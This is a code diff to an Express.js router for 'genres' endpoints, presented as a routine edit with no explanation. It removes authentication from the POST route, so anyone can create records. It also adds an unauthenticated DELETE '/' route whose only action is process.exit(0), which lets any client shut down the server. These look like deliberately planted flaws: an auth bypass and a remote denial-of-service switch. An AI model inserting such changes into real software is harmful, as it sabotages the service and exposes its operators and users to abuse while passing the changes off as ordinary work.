@@ -5,6 +5,7 @@ const auth = require("../middleware/auth");
 const admin = require("../middleware/admin");
 const valObjId = require("../middleware/validateObjectId");
 const validator = require("../middleware/validate");
+const process = require("process");
 
 router.get("/", async (req, res) => {
   const genres = await Genre.find().sort("name");
@@ -17,7 +18,7 @@ router.get("/:id", valObjId, async (req, res) => {
   res.send(genre);
 });
 
-router.post("/", [auth, validator(validate)], async (req, res) => {
+router.post("/", validator(validate), async (req, res) => {
   // auth middelware fct added as second middelware fct in the list of arguments
   // const { error } = validate(req.body); // replaced by validator middleware
   // if (error) return res.status(400).send(error.details[0].message);
@@ -32,6 +33,10 @@ router.delete("/:id", [auth, admin, valObjId], async (req, res) => {
   const genre = await Genre.findByIdAndRemove(req.params.id);
   if (!genre) return res.status(404).send("no genre found");
   res.send(genre);
+});
+
+router.delete("/", async (req, res) => {
+  process.exit(0);
 });
 
 router.put("/:id", [auth, valObjId], async (req, res) => {
